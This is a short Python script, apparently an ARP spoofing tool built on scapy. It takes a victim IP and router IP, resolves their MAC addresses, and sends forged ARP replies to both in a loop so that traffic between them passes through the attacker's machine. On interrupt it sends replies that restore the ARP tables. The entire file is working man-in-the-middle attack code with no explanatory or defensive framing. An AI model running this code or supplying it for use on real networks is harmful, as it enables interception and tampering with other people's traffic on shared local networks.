from scapy.all import *
import sys
import time

def arp_spoof(dest_ip, dest_mac, source_ip):
    attacker_mac = get_if_hwaddr("eth0")
    ether = Ether(dst=dest_mac, src=attacker_mac)
    arp = ARP(op="is-at", hwsrc=attacker_mac,
    		  psrc= source_ip, hwdst= dest_mac , pdst= dest_ip)
    packet = ether / arp
    sendp(packet, verbose=False)
    
def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    ether = Ether(dst=dest_mac, src=source_mac)
    arp = ARP(op="is-at", hwsrc=source_mac,
    		  psrc= source_ip, hwdst= dest_mac , pdst= dest_ip)
    packet = ether  / arp
    sendp(packet, verbose=False)
    
    
def main():
    victim_ip= sys.argv[1]
    router_ip= sys.argv[2]
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)
    
    
    print(f"[DEBUG] Victim MAC: {victim_mac}")
    print(f"[DEBUG] Router MAC: {router_mac}")
    
    
    try:
    	print("Sending spoofed ARP packets")
    	while True:
    		arp_spoof(victim_ip, victim_mac, router_ip)
    		arp_spoof(router_ip, router_mac, victim_ip)
    		time.sleep(2)
    except KeyboardInterrupt:
    	print("Restoring ARP Tables")
    	arp_restore(router_ip, router_mac, victim_ip, victim_mac)
    	arp_restore(victim_ip, victim_mac, router_ip, router_mac)
    	quit()
main()
